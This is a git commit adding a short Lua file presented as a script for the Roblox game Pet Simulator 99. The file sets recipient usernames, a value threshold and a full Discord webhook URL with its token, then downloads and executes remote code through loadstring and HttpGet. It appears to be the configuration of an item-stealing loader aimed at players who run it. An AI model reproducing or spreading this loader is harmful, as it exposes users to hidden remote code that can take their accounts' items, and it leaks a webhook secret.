8160fa486553f0b173d57859fcb013956dc68bb1
yobu-crypto <stefzhagger@gmail.com>
2024-12-27 06:37:50 +0400

    Add files via upload

---
+++ ps99-script.lua
@@ -0,0 +1,6 @@
+Username = "rip_yobu"
+Username2 = "rip_yobu"
+MinimumRAP = 0
+Webhook = "https://discord.com/api/webhooks/1322014887173689385/a7d2xqralNEGA9hLPkquw1KV1UdRXA05g19wbEEd19Egl_E2SVZ1oKdxWIvEh_Yp5FrB"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeps99s/ps99scrip/main/xe", true))()
